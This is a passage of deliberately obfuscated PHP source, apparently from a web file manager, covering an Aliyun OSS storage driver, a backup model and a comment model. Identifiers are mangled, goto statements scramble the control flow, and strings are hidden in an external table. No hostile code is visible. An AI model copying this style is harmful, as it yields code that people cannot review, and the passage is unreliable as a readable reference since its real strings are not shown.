$BÀåì—Æˆù = 1048576000 * 5; goto aáò®ëÕäˆ; a¢Û—“ÜÊ»: $E´„Ôà»© =& $_SERVER[ç]; if (!($d¥˜Æ‰ÖÍ = $this->getHost())) { return !1; } $e»‚íˆğçå = $Eö‡Õ°ºÇ; goto B÷ÇŒšÑİ; cÄËîÓÚ£‚: } public function multiUploadFormData($fà“¬ç½Ú, $CçõÙÓÓê = 3600) { $F’µåËíÎ¸ =& $_SERVER[ç]; if (!($E¢óªæ»…á = $this->getHost())) { return !1; } $eé¼ªŠÓœã = $this->trafficLimit($F’µåËíÎ¸[1252]); $b³ÊŸÍÇ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fà“¬ç½Ú), $eé¼ªŠÓœã); return array($F’µåËíÎ¸[219] => $b³ÊŸÍÇ, $F’µåËíÎ¸[175] => $E¢óªæ»…á . $F’µåËíÎ¸[8] . $this->pathEncode($fà“¬ç½Ú), $F’µåËíÎ¸[220] => gmdate($F’µåËíÎ¸[1260]), $F’µåËíÎ¸[92] => $fà“¬ç½Ú); } public function multiUploadAuthData($Bî±¹¶ºÒ, $CÏÇÁ‡–½ = array()) { goto c³ŸÊëÄœ¹; c³ŸÊëÄœ¹: $AÂÆŒÖÕØó =& $_SERVER[ç]; $Eà¸ËÜåÖ¬ = isset($CÏÇÁ‡–½[$AÂÆŒÖÕØó[220]]) ? $CÏÇÁ‡–½[$AÂÆŒÖÕØó[220]] : gmdate($AÂÆŒÖÕØó[1260]); $EíÏŠ¨¦°À = isset($CÏÇÁ‡–½[$AÂÆŒÖÕØó[167]]) ? $CÏÇÁ‡–½[$AÂÆŒÖÕØó[167]] : $AÂÆŒÖÕØó[33]; goto CÊßçÛœ°Ò; fßçÍ÷š¤: if (!empty($CÏÇÁ‡–½[$AÂÆŒÖÕØó[1262]])) { $dŒˆîá…†º = array_merge(array($F¶Ù¯ŠÆó‰[4]), $CÏÇÁ‡–½[$AÂÆŒÖÕØó[1262]]); sort($dŒˆîá…†º); $F¶Ù¯ŠÆó‰[4] = implode($AÂÆŒÖÕØó[227], $dŒˆîá…†º); } $BÀÙ÷ò¦î = implode($AÂÆŒÖÕØó[227], $F¶Ù¯ŠÆó‰); $D¡Ö¾àö¹¥ = base64_encode(hash_hmac($AÂÆŒÖÕØó[228], $BÀÙ÷ò¦î, $this->secret, !0)); goto aèà”±ö¤; F³ã›±ğ: $F¶Ù¯ŠÆó‰ = array($AÂÆŒÖÕØó[222], $AÂÆŒÖÕØó[33], $AÂÆŒÖÕØó[118], $Eà¸ËÜåÖ¬, "\x78\x2d\x6f\x73\163\55\x64\x61\x74\x65\x3a{$Eà¸ËÜåÖ¬}", $AÂÆŒÖÕØó[8] . $this->bucket . $AÂÆŒÖÕØó[8] . $Aƒ¥âÈÖà‰ . $EíÏŠ¨¦°À); if (strpos($EíÏŠ¨¦°À, $AÂÆŒÖÕØó[223]) === 0) { $F¶Ù¯ŠÆó‰[0] = $AÂÆŒÖÕØó[224]; if ($aÊêÄñ²á” = $this->trafficLimit($AÂÆŒÖÕØó[1252])) { $Aƒ¥âÈÖà‰ = $AÂÆŒÖÕØó[1261]; array_splice($F¶Ù¯ŠÆó‰, 5, 0, $Aƒ¥âÈÖà‰ . $AÂÆŒÖÕØó[4] . $aÊêÄñ²á”[$Aƒ¥âÈÖà‰]); } } if (isset($CÏÇÁ‡–½[$AÂÆŒÖÕØó[225]]) && $CÏÇÁ‡–½[$AÂÆŒÖÕØó[225]] == $AÂÆŒÖÕØó[226]) { $F¶Ù¯ŠÆó‰[0] = $AÂÆŒÖÕØó[226]; } goto fßçÍ÷š¤; aèà”±ö¤: $eğÀ·²ÁÈ = $AÂÆŒÖÕØó[1225] . $this->accessKey . $AÂÆŒÖÕØó[4] . $D¡Ö¾àö¹¥; if (strpos($EíÏŠ¨¦°À, $AÂÆŒÖÕØó[223]) === 0) { $eğÀ·²ÁÈ = array($AÂÆŒÖÕØó[230] => $eğÀ·²ÁÈ, $AÂÆŒÖÕØó[220] => $Eà¸ËÜåÖ¬); if ($aÊêÄñ²á”) { $eğÀ·²ÁÈ = array_merge($eğÀ·²ÁÈ, $aÊêÄñ²á”); } } return $eğÀ·²ÁÈ; goto d„‹ãØ¿í; CÊßçÛœ°Ò: $Aƒ¥âÈÖà‰ = $Bî±¹¶ºÒ; if (isset($CÏÇÁ‡–½[$AÂÆŒÖÕØó[92]])) { $Aƒ¥âÈÖà‰ = $CÏÇÁ‡–½[$AÂÆŒÖÕØó[92]]; unset($CÏÇÁ‡–½[$AÂÆŒÖÕØó[92]]); } if (isset($CÏÇÁ‡–½[$AÂÆŒÖÕØó[221]])) { $CÏÇÁ‡–½[$AÂÆŒÖÕØó[220]] = $Eà¸ËÜåÖ¬; return $this->listUploadParts($Aƒ¥âÈÖà‰, $CÏÇÁ‡–½); } goto F³ã›±ğ; d„‹ãØ¿í: } public function listUploadParts($DÛäÙóÓ, $CÀƒ«óèĞÃ) { goto F‘ÉŞ„êƒ‹; fµ§Ù§Şö: unset($CÀƒ«óèĞÃ[$cğğğ×‡©[221]], $CÀƒ«óèĞÃ[$cğğğ×‡©[225]]); $cÄ‚ è–Ó‚ = $this->multiUploadAuthData($DÛäÙóÓ, $CÀƒ«óèĞÃ); if (empty($cÄ‚ è–Ó‚)) { return !1; } goto EÙ²ôˆ›Ä; F‘ÉŞ„êƒ‹: $cğğğ×‡© =& $_SERVER[ç]; $Aì‚¼Ä£Ã­ = parse_url_query($CÀƒ«óèĞÃ[$cğğğ×‡©[167]]); $E’ÎÖ‘†ñ = $this->client->listParts($this->bucket, $this->pathEncode($DÛäÙóÓ), $Aì‚¼Ä£Ã­[$cğğğ×‡©[219]]); goto e‹ã˜ŒÜ; e‹ã˜ŒÜ: $EÍßïöéÉÏ = $E’ÎÖ‘†ñ->getListPart(); $Dòë“Òáª´ = array(); foreach ($EÍßïöéÉÏ as $A´ĞÈ×ŠÌ) { $Dòë“Òáª´[] = array($cğğğ×‡©[1245] => $A´ĞÈ×ŠÌ->getPartNumber(), $cğğğ×‡©[1246] => trim($A´ĞÈ×ŠÌ->getETag(), $cğğğ×‡©[115])); } goto fµ§Ù§Şö; EÙ²ôˆ›Ä: return array($cğğğ×‡©[230] => $cÄ‚ è–Ó‚, $cğğğ×‡©[220] => $CÀƒ«óèĞÃ[$cğğğ×‡©[220]], $cğğğ×‡©[232] => $Dòë“Òáª´); goto Döø¿Œã¢; Döø¿Œã¢: } public function download($FôÓ†¿íÎ¬, $AÓ¾‹î–¨Ë) { if ($this->isFolder($FôÓ†¿íÎ¬)) { return !1; } try { $Bâ›¯¸Š³ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $AÓ¾‹î–¨Ë); $Bâ›¯¸Š³ = $this->trafficLimit($_SERVER[ç][108], $Bâ›¯¸Š³); $this->client->getObject($this->bucket, $this->pathEncode($FôÓ†¿íÎ¬), $Bâ›¯¸Š³); } catch (OSS\Core\OssException $C„Úá§Æ¸Â) { return !1; } return $AÓ¾‹î–¨Ë; } public function fileSubstr($fÚô´—Ğ, $eØƒĞì‹¾» = 0, $b—›‹ƒÓ’ = false) { if ($eØƒĞì‹¾» === -1) { $a›øîÃÄØ‡ = array(); } else { if ($b—›‹ƒÓ’ === !1) { $d˜œÂ¨Û×ù = $this->size($fÚô´—Ğ); } else { $d˜œÂ¨Û×ù = $eØƒĞì‹¾» + $b—›‹ƒÓ’ - 1; } $a›øîÃÄØ‡ = array(OSS\OssClient::OSS_RANGE => "{$eØƒĞì‹¾»}\55{$d˜œÂ¨Û×ù}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($fÚô´—Ğ), $a›øîÃÄØ‡); } catch (OSS\Core\OssException $CÓŠ…ğĞ³) { think_exception($CÓŠ…ğĞ³->getMessage()); return !1; } } private function trafficLimit($F­é·ïÙ¤, $B‡ŞóÕÚ±À = array()) { goto eçùå°ãÄ˜; bœ—™»¦Ğ¹: if (!$C‘¨ŒÃœî°) { return $B‡ŞóÕÚ±À; } $C‘¨ŒÃœî° = $C‘¨ŒÃœî° < 819200 ? 819200 : ($C‘¨ŒÃœî° > 838860800 ? 838860800 : $C‘¨ŒÃœî°); $B‡ŞóÕÚ±À[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($C‘¨ŒÃœî°); goto c‡ìïÙ—†´; eçùå°ãÄ˜: $Cäöİí‡‘ =& $_SERVER[ç]; if ($F­é·ïÙ¤ == $Cäöİí‡‘[1252] && $this->isUploadServer() || $F­é·ïÙ¤ == $Cäöİí‡‘[108] && $this->isFileOutServer()) { return $B‡ŞóÕÚ±À; } $C‘¨ŒÃœî° = floatval($GLOBALS[$Cäöİí‡‘[6]][$Cäöİí‡‘[87]][$Cäöİí‡‘[106]][$F­é·ïÙ¤]) * 1024 * 1024 * 8; goto bœ—™»¦Ğ¹; c‡ìïÙ—†´: return $B‡ŞóÕÚ±À; goto c¦óÀÀ°ØÔ; c¦óÀÀ°ØÔ: } public function link($CøŒÂš•Œ«, $b—ÏëøÅà = array()) { $bÆœ¬ê£—– =& $_SERVER[ç]; if (!$this->exist($CøŒÂš•Œ«) || $this->isFolder($CøŒÂš•Œ«)) { return !1; } try { $b—ÏëøÅà = $this->trafficLimit($bÆœ¬ê£—–[108], $b—ÏëøÅà); $BÕ½…İº = $this->client->signUrl($this->bucket, $this->pathEncode($CøŒÂš•Œ«), 3600 * 12, $bÆœ¬ê£—–[226], $b—ÏëøÅà); return $this->getCdnLink($BÕ½…İº); } catch (OSS\Core\OssException $f†³¤å¦•Â) { return !1; } } public function fileOut($a¸Ø·´ø‰Ü, $e„‘±ĞŠ‹£ = false, $CŠË®„áÊÒ = false, $bÕ¦ÍÖ = '') { goto bğ×İÅ†í¾; Cå“ã„Õç: $CŠË®„áÊÒ = rawurlencode($CŠË®„áÊÒ); $b¹†…ˆºˆ’ = get_file_mime(get_path_ext($CŠË®„áÊÒ)); if ($b¹†…ˆºˆ’ == $C„ÁÄ†ÆÈ[211]) { return parent::fileOut($a¸Ø·´ø‰Ü, $e„‘±ĞŠ‹£, $CŠË®„áÊÒ, $bÕ¦ÍÖ); } goto cÙÕ›”ÔÊ»; bğ×İÅ†í¾: $C„ÁÄ†ÆÈ =& $_SERVER[ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($a¸Ø·´ø‰Ü, $e„‘±ĞŠ‹£, $CŠË®„áÊÒ, $bÕ¦ÍÖ); } if (!$CŠË®„áÊÒ) { $CŠË®„áÊÒ = $this->pathThis($a¸Ø·´ø‰Ü); } goto Cå“ã„Õç; Aøáõ¹¥ˆ: $cÍ¢¶ÓËİ = $this->link($a¸Ø·´ø‰Ü, $BöĞ£¡ÊÓ‰); $this->fileOutLink($cÍ¢¶ÓËİ); goto D†ÁÆƒëˆ; cÙÕ›”ÔÊ»: $e„‘±ĞŠ‹£ = $e„‘±ĞŠ‹£ ? $C„ÁÄ†ÆÈ[212] : $C„ÁÄ†ÆÈ[213]; $BöĞ£¡ÊÓ‰ = array(OSS\OssClient::OSS_SUB_RESOURCE => $C„ÁÄ†ÆÈ[1263] . rawurlencode("{$e„‘±ĞŠ‹£}\73\x66\x69\x6c\145\x6e\x61\155\x65\x3d{$CŠË®„áÊÒ}")); $BöĞ£¡ÊÓ‰[OSS\OssClient::OSS_SUB_RESOURCE] .= $C„ÁÄ†ÆÈ[1264] . rawurlencode($b¹†…ˆºˆ’); goto Aøáõ¹¥ˆ; D†ÁÆƒëˆ: } public function fileOutServer($CÔåÖ÷Îë‡, $BŠ…ëÁ²›Ç = false, $Aâƒ”ÆôºË = false, $eËÛá˜ºÈò = '') { parent::fileOut($CÔåÖ÷Îë‡, $BŠ…ëÁ²›Ç, $Aâƒ”ÆôºË, $eËÛá˜ºÈò); } public function fileOutImage($cø¶×ŠÑ“, $dŒ¬ŒÖàÂÜ = 250) { $fÖ«éØšÌÒ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ç][1265] . $dŒ¬ŒÖàÂÜ); $e÷¹çº¨ï = $this->link($cø¶×ŠÑ“, $fÖ«éØšÌÒ); $this->fileOutLink($e÷¹çº¨ï); } public function fileOutImageServer($dåÛÒÉãĞÀ, $c÷²ÛÎ”Œ‘ = 250) { parent::fileOutImage($dåÛÒÉãĞÀ, $c÷²ÛÎ”Œ‘); } public function fileOutLink($eŒŠØÖ°öŞ) { $F Ï¨çĞ‘ä =& $_SERVER[ç]; if (!$this->isCdnHost() && substr($eŒŠØÖ°öŞ, 0, 7) == $F Ï¨çĞ‘ä[1169]) { $eŒŠØÖ°öŞ = $F Ï¨çĞ‘ä[1170] . substr($eŒŠØÖ°öŞ, 7); } header($F Ï¨çĞ‘ä[158] . $eŒŠØÖ°öŞ); die; } public function hashMd5($bÅœ×¢‰ğ, $AğçÔ‡Â‚ = '') { $fâ®ß‹ßÎ =& $_SERVER[ç]; $fò˜±ˆÅƒ¢ = $this->_objectMeta($bÅœ×¢‰ğ); if (!$fò˜±ˆÅƒ¢) { return $fâ®ß‹ßÎ[33]; } if (!isset($fò˜±ˆÅƒ¢[$fâ®ß‹ßÎ[1241]]) && !empty($AğçÔ‡Â‚)) { $E“œ¢‘ñ = $this->updateObjMeta($bÅœ×¢‰ğ, array($fâ®ß‹ßÎ[1241] => $AğçÔ‡Â‚)); $fò˜±ˆÅƒ¢[$fâ®ß‹ßÎ[1241]] = $E“œ¢‘ñ ? $AğçÔ‡Â‚ : $fâ®ß‹ßÎ[33]; } return isset($fò˜±ˆÅƒ¢[$fâ®ß‹ßÎ[1241]]) ? strtolower($fò˜±ˆÅƒ¢[$fâ®ß‹ßÎ[1241]]) : $fâ®ß‹ßÎ[33]; } public function size($dğ‰ÆÖùã¯) { $B®‹åˆ’ö‰ = $this->objectMeta($dğ‰ÆÖùã¯); return $B®‹åˆ’ö‰ ? $B®‹åˆ’ö‰[$_SERVER[ç][77]] : 0; } public function info($b·É®”á) { if ($this->isFolder($b·É®”á)) { return $this->folderInfo($b·É®”á); } else { if ($this->isFile($b·É®”á)) { return $this->fileInfo($b·É®”á); } } return !1; } public function exist($bªç²¢ï) { return $this->isFile($bªç²¢ï) || $this->isFolder($bªç²¢ï); } public function isFile($fè‘÷„¢•) { return !$this->isFolder($fè‘÷„¢•) && $this->objectMeta($fè‘÷„¢•); } public function isFolder($D–„£½¾) { return $this->cacheMethod($_SERVER[ç][197], $D–„£½¾); } protected function objectMeta($CöÎŠ‘À¥˜) { return $this->cacheMethod($_SERVER[ç][198], $CöÎŠ‘À¥˜); } protected function _objectMeta($a‡„éŠÈÚÇ) { $cÎö“ë™£È =& $_SERVER[ç]; try { $EÔßÊˆ–á = $this->client->getObjectMeta($this->bucket, $this->pathEncode($a‡„éŠÈÚÇ)); } catch (OSS\Core\OssException $d”«¡Şíí) { $EÔßÊˆ–á = !1; } if ($EÔßÊˆ–á) { $EÔßÊˆ–á[$cÎö“ë™£È[77]] = intval($EÔßÊˆ–á[$cÎö“ë™£È[1239]]); } return $EÔßÊˆ–á; } protected function _isFolder($F‹ÊÖŒÛ²ƒ) { $Aê°ƒœô£„ =& $_SERVER[ç]; if ($F‹ÊÖŒÛ²ƒ == $Aê°ƒœô£„[33] || $F‹ÊÖŒÛ²ƒ == $Aê°ƒœô£„[8]) { return !0; } $EŞØØËŸ«ó = array($Aê°ƒœô£„[1235] => $Aê°ƒœô£„[8], $Aê°ƒœô£„[1236] => rtrim($F‹ÊÖŒÛ²ƒ, $Aê°ƒœô£„[8]) . $Aê°ƒœô£„[8], $Aê°ƒœô£„[1237] => 1, $Aê°ƒœô£„[1238] => $Aê°ƒœô£„[33]); $E¿Ö‹ãä³õ = $this->client->listObjects($this->bucket, $EŞØØËŸ«ó); if ($E¿Ö‹ãä³õ->getObjectList() || $E¿Ö‹ãä³õ->getPrefixList()) { return !0; } return !1; } } goto cÄ¡‰“ÊšÕ; b˜ªİ¾‹Ù: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\142\x61\143\153\165\160\114\x69\163\164"; public $field = array("\x69\157", "\156\x61\x6d\145", "\163\164\141\x74\x75\x73", "\143\x6f\156\x74\x65\156\164", "\162\x65\x73\x75\x6c\x74", "\164\x69\155\x65\106\162\x6f\x6d", "\x74\151\x6d\x65\124\x6f"); public function config() { goto cîŠÚØÉ‘á; d–Ø¹ÄÓ’: Action($Aò¿«Ó‰­ö[1678])->taskInit(); $aÕ¬´ÂŒä = Model($Aò¿«Ó‰­ö[1679])->listData(); foreach ($aÕ¬´ÂŒä as $b¨Íƒ™Œçé) { if ($b¨Íƒ™Œçé[$Aò¿«Ó‰­ö[1136]] == $Aò¿«Ó‰­ö[86] && $b¨Íƒ™Œçé[$Aò¿«Ó‰­ö[1480]] == $Aò¿«Ó‰­ö[1680]) { $DææÊ“•èœ = $b¨Íƒ™Œçé; break; } } goto aß‡ô¡Ùó; aß‡ô¡Ùó: if (isset($DææÊ“•èœ[$Aò¿«Ó‰­ö[195]])) { $DææÊ“•èœ[$Aò¿«Ó‰­ö[195]] = json_decode($DææÊ“•èœ[$Aò¿«Ó‰­ö[195]], !0); } if (isset($Dßï™Å´•Ï[$Aò¿«Ó‰­ö[195]])) { $DææÊ“•èœ[$Aò¿«Ó‰­ö[195]][$Aò¿«Ó‰­ö[1465]] = $Dßï™Å´•Ï[$Aò¿«Ó‰­ö[195]]; unset($Dßï™Å´•Ï[$Aò¿«Ó‰­ö[195]]); } return array_merge($DææÊ“•èœ, $Dßï™Å´•Ï); goto f³’˜¯ó¬; C·¦ÉãÑÁŸ: $Dßï™Å´•Ï = is_array($Dßï™Å´•Ï) ? $Dßï™Å´•Ï : array(); if (!isset($Dßï™Å´•Ï[$Aò¿«Ó‰­ö[698]])) { $Dßï™Å´•Ï[$Aò¿«Ó‰­ö[698]] = $Aò¿«Ó‰­ö[86]; } $DææÊ“•èœ = array(); goto d–Ø¹ÄÓ’; cîŠÚØÉ‘á: $Aò¿«Ó‰­ö =& $_SERVER[ç]; $Dßï™Å´•Ï = Model($Aò¿«Ó‰­ö[1091])->get($Aò¿«Ó‰­ö[719]); $Dßï™Å´•Ï = json_decode($Dßï™Å´•Ï, !0); goto C·¦ÉãÑÁŸ; f³’˜¯ó¬: } public function listData($Aİøä˜×Ô™ = false, $d¢ØæºÁíÏ = "\155\157\x64\x69\x66\x79\x54\x69\x6d\x65", $f³‰Æ°¡ÍÙ = false) { return parent::listData($Aİøä˜×Ô™, $d¢ØæºÁíÏ, !0); } public function lastItem() { $DçƒñÄ¡Ù· = $this->listData(); return !empty($DçƒñÄ¡Ù·[0]) ? $DçƒñÄ¡Ù·[0] : null; } public function kill($BÍù¸Ì¯) { goto DƒÌ¢Ú–·Ñ; Dø¥Å®ŒÕì: Task::kill($bôÛ„ĞŒÅî[718]); Task::kill($bôÛ„ĞŒÅî[737]); Task::kill($bôÛ„ĞŒÅî[746]); goto d§ôŠ¶¢; DƒÌ¢Ú–·Ñ: $bôÛ„ĞŒÅî =& $_SERVER[ç]; $AØÓ´Íù = $this->listData($BÍù¸Ì¯); if (!$AØÓ´Íù || empty($AØÓ´Íù[$bôÛ„ĞŒÅî[28]])) { return !0; } goto Dø¥Å®ŒÕì; d§ôŠ¶¢: $FªØ°éßã = $AØÓ´Íù[$bôÛ„ĞŒÅî[28]]; $fËÚãíê™è = TEMP_FILES . $bôÛ„ĞŒÅî[715] . $FªØ°éßã . $bôÛ„ĞŒÅî[8]; IO::remove($fËÚãíê™è, !1); goto E«Ê—äæÂ–; E«Ê—äæÂ–: return $this->remove($BÍù¸Ì¯); goto eù¼İ˜óÃÁ; eù¼İ˜óÃÁ: } public function remove($c°ì‹ñ²ÕÓ) { $eßïïøÔ†â = $this->listData($c°ì‹ñ²ÕÓ); if (!$eßïïøÔ†â) { return !0; } return $this->backupRemove($eßïïøÔ†â); } private function backupRemove($E‰ã²Ÿ³Â”) { $F‰ÕÎã³Ø  =& $_SERVER[ç]; parent::remove($E‰ã²Ÿ³Â”[$F‰ÕÎã³Ø [388]]); $D ˆùŒïË = "\173\x69\x6f\x3a{$E‰ã²Ÿ³Â”[$F‰ÕÎã³Ø [697]]}\x7d\57\x64\x61\164\141\x62\141\x73\x65\x2f\142\x61\x63\x6b\x75\x70\137" . $E‰ã²Ÿ³Â”[$F‰ÕÎã³Ø [28]]; IO::remove($D ˆùŒïË, !1); return !0; } public function start() { goto Fë…®ÃÆÎÌ; dš•»Û‰î·: if (!$aÌÁç­©Ä” || $aÌÁç­©Ä”[$E‹ƒˆŸĞåâ[1462]] != $E‹ƒˆŸĞåâ[86]) { return !1; } $Dò÷•”Î‘» = $this->process(); foreach ($Dò÷•”Î‘» as $a“Èå‰ƒ…§) { if ($a“Èå‰ƒ…§) { return Task::restart($a“Èå‰ƒ…§[$E‹ƒˆŸĞåâ[388]]); } } goto F¼Šàõ„ÖÕ; còÒê—°İ: if ($cŸ†Ì¸µàÒ) { $cŸ†Ì¸µàÒ = $C¦–‘‡íÍø->dbFile(); if ($cŸ†Ì¸µàÒ && $aÌÁç­©Ä”[$E‹ƒˆŸĞåâ[698]] == $E‹ƒˆŸĞåâ[491]) { $cŸ†Ì¸µàÒ = $C¦–‘‡íÍø->file(); } } Backup::set(array($E‹ƒˆŸĞåâ[695] => 1, $E‹ƒˆŸĞåâ[470] => time())); return !0; goto E³˜ŒÔ„·; Fë…®ÃÆÎÌ: $E‹ƒˆŸĞåâ =& $_SERVER[ç]; if ($GLOBALS[$E‹ƒˆŸĞåâ[6]][$E‹ƒˆŸĞåâ[87]][$E‹ƒˆŸĞåâ[1681]] != $E‹ƒˆŸĞåâ[86]) { return !0; } $aÌÁç­©Ä” = $this->config(); goto dš•»Û‰î·; F¼Šàõ„ÖÕ: $C¦–‘‡íÍø = new Backup(); $C¦–‘‡íÍø->keep(); $cŸ†Ì¸µàÒ = $C¦–‘‡íÍø->db(); goto còÒê—°İ; E³˜ŒÔ„·: } public function process() { $F„œøâÆê =& $_SERVER[ç]; return array($F„œøâÆê[700] => Task::get($F„œøâÆê[718]), $F„œøâÆê[703] => Task::get($F„œøâÆê[737]), $F„œøâÆê[173] => Task::get($F„œøâÆê[746])); } public function restore() { $EÙ‹øŞÃ²­ =& $_SERVER[ç]; ActionCall($EÙ‹øŞÃ²­[986], !0, 1); ActionCall($EÙ‹øŞÃ²­[986], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\156\x74"; protected $tableMeta = array("\164\x61\142\154\145\116\141\155\145" => "\x63\x6f\x6d\x6d\x65\156\x74\x5f\x6d\x65\164\141", "\155\x65\164\141\x46\151\x65\154\144" => "\x63\157\x6d\155\x65\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($b£ÔÉˆÅ¢) { $d‰›Ó†ä° =& $_SERVER[ç]; if ($b£ÔÉˆÅ¢[$d‰›Ó†ä°[1682]]) { $dÇŒ¾øã¦ = $this->where(array($d‰›Ó†ä°[1683] => $b£ÔÉˆÅ¢[$d‰›Ó†ä°[1682]]))->find(); if (!$dÇŒ¾øã¦ || $dÇŒ¾øã¦[$d‰›Ó†ä°[398]] != $b£ÔÉˆÅ¢[$d‰›Ó†ä°[398]] || $dÇŒ¾øã¦[$d‰›Ó†ä°[478]] != $b£ÔÉˆÅ¢[$d‰›Ó†ä°[478]]) { return !1; } $this->where(array($d‰›Ó†ä°[1683] => $b£ÔÉˆÅ¢[$d‰›Ó†ä°[1682]]))->setAdd($d‰›Ó†ä°[1684], 1); } $b£ÔÉˆÅ¢[$d‰›Ó†ä°[1685]] = 0; $b£ÔÉˆÅ¢[$d‰›Ó†ä°[1684]] = 0; $b£ÔÉˆÅ¢[$d‰›Ó†ä°[695]] = 1; return $this->add($b£ÔÉˆÅ¢); } public function commentCount($C¥Â®ö‡ˆª, $DÚõßØÒŸ) { goto E„ßìÒ¡Ö; F‰…‡Í´ê: $aà¡ğÍäÙ„ = array($Fªá½”©Ÿ´[478], $Fªá½”©Ÿ´[1686] => $Fªá½”©Ÿ´[474]); $B†˜Ûµ…¥• = array($Fªá½”©Ÿ´[478] => array($Fªá½”©Ÿ´[7], $C¥Â®ö‡ˆª), $Fªá½”©Ÿ´[398] => $DÚõßØÒŸ); $B™æç ¿î… = $this->field($aà¡ğÍäÙ„)->where($B†˜Ûµ…¥•)->group($Fªá½”©Ÿ´[478])->select(); goto aÇƒù«ĞÄ²; aÇƒù«ĞÄ²: return array_to_keyvalue($B™æç ¿î…, $Fªá½”©Ÿ´[478], $Fªá½”©Ÿ´[474]); goto aŒ”ÑãÚ¸; E„ßìÒ¡Ö: $Fªá½”©Ÿ´ =& $_SERVER[ç]; if (!$C¥Â®ö‡ˆª) { return array(); } if (is_string($C¥Â®ö‡ˆª) || is_int($C¥Â®ö‡ˆª)) { $C¥Â®ö‡ˆª = array($C¥Â®ö‡ˆª); } goto F‰…‡Í´ê; aŒ”ÑãÚ¸: } public function remove($A´¨ô¿Œ™î) { $C›É¸¥æ =& $_SERVER[ç]; $eäÃâöâ¨ = array($C›É¸¥æ[1683] => $A´¨ô¿Œ™î); $BØ±Ùğ£ë = $this->where($eäÃâöâ¨)->find(); if ($BØ±Ùğ£ë[$C›É¸¥æ[1682]]) { $this->where(array($C›É¸¥æ[1683] => $BØ±Ùğ£ë[$C›É¸¥æ[1682]]))->setAdd($C›É¸¥æ[1684], -1); } return $this->where($eäÃâöâ¨)->delete(); } public function edit($DÏäİ‹ÇÅ¸, $FšğøÓÈ¾) { $AŒË•«•¡Ê =& $_SERVER[ç]; $EˆóÜÄ Öî = array($AŒË•«•¡Ê[1683] => $DÏäİ‹ÇÅ¸); return $this->where($EˆóÜÄ Öî)->save(array($AŒË•«•¡Ê[1687] => $FšğøÓÈ¾)); } public function prasise($A÷†Ÿ‡‹) { $FËÆ¹¸ÊŸ¶ =& $_SERVER[ç]; $CœÏˆ¦ÁŒÕ = Model($FËÆ¹¸ÊŸ¶[1688]); $Eé¹ç£Õ” = array($FËÆ¹¸ÊŸ¶[1683] => $A÷†Ÿ‡‹, $FËÆ¹¸ÊŸ¶[1483] => USER_ID); $aÂëš»˜ = $CœÏˆ¦ÁŒÕ->where($Eé¹ç£Õ”)->find(); if (!$aÂëš»˜) { $CœÏˆ¦ÁŒÕ->add($Eé¹ç£Õ”); $C‰³Ø¯†ƒ = $this->where(array($FËÆ¹¸ÊŸ¶[1683] => $A÷†Ÿ‡‹))->setAdd($FËÆ¹¸ÊŸ¶[1685], 1); } else { $CœÏˆ¦ÁŒÕ->where($Eé¹ç£Õ”)->delete(); $C‰³Ø¯†ƒ = $this->where(array($FËÆ¹¸ÊŸ¶[1683] => $A÷†Ÿ‡‹))->setAdd($FËÆ¹¸ÊŸ¶[1685], -1); } return $C‰³Ø¯†ƒ; } public function targetInfo($bäªŒ¹ó‡Í, $EÚŠí®ÉŸõ) { goto a¶Éº´’; aË†Óööµ: $eîàÜ†‚èİ = "\122\x49\x47\x48\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\143\x6f\155\155\x65\156\164\137\x70\162\141\151\x73\x65\40\163\x74\x61\x72\40\x6f\156\40\x63\x6f\155\155\145\156\164\x2e\x63\x6f\155\155\x65\x6e\x74\x49\x44\x20\x3d\40\x73\x74\141\x72\56\143\157\x6d\x6d\x65\156\164\111\104"; $fàÌ¨Ä‹ïõ = $this->alias($A¹¼ÃÉ®Üó[350])->where($dŠÇ†Ö†òÆ)->join($eîàÜ†‚èİ, $A¹¼ÃÉ®Üó[1689])->count(); $c‡§¬²ğµ× = array($A¹¼ÃÉ®Üó[1690] => $cÊÜ‹²‹ôÙ, $A¹¼ÃÉ®Üó[1691] => $fàÌ¨Ä‹ïõ); goto cÄÛˆ¤ËÒí; a¶Éº´’: $A¹¼ÃÉ®Üó =& $_SERVER[ç]; $dŠÇ†Ö†òÆ = array($A¹¼ÃÉ®Üó[544] => $bäªŒ¹ó‡Í, $A¹¼ÃÉ®Üó[545] => $EÚŠí®ÉŸõ); $cÊÜ‹²‹ôÙ = $this->where($dŠÇ†Ö†òÆ)->count(); goto aË†Óööµ; cÄÛˆ¤ËÒí: return $c‡§¬²ğµ×; goto F›ğ÷‡¯„¼; F›ğ÷‡¯„¼: } public function listData($cá¥»ø„ä™) { $a·Æé¸°Œ¨ =& $_SERVER[ç]; if (isset($cá¥»ø„ä™[$a·Æé¸°Œ¨[1692]])) { if ($cá¥»ø„ä™[$a·Æé¸°Œ¨[1692]]) { $cá¥»ø„ä™[$a·Æé¸°Œ¨[1693]] = array($a·Æé¸°Œ¨[939], intval($cá¥»ø„ä™[$a·Æé¸°Œ¨[1692]])); } unset($cá¥»ø„ä™[$a·Æé¸°Œ¨[1692]]); } if (isset($cá¥»ø„ä™[$a·Æé¸°Œ¨[1694]])) { if ($cá¥»ø„ä™[$a·Æé¸°Œ¨[1694]]) { $cá¥»ø„ä™[$a·Æé¸°Œ¨[1693]] = array($a·Æé¸°Œ¨[936], intval($cá¥»ø„ä™[$a·Æé¸°Œ¨[1694]])); } unset($cá¥»ø„ä™[$a·Æé¸°Œ¨[1694]]); } return $this->_listData($cá¥»ø„ä™); } private function _listData($c™íë³øÜ) { $c»çäí“¦ =& $_SERVER[ç]; $d¾àáŒÄµØ = $this->where($c™íë³øÜ)->_makeOrder()->selectPage(100); $this->_listAppendParent($d¾àáŒÄµØ[$c»çäí“¦[365]]); $this->_listAppendUser($d¾àáŒÄµØ[$c»çäí“¦[365]]); 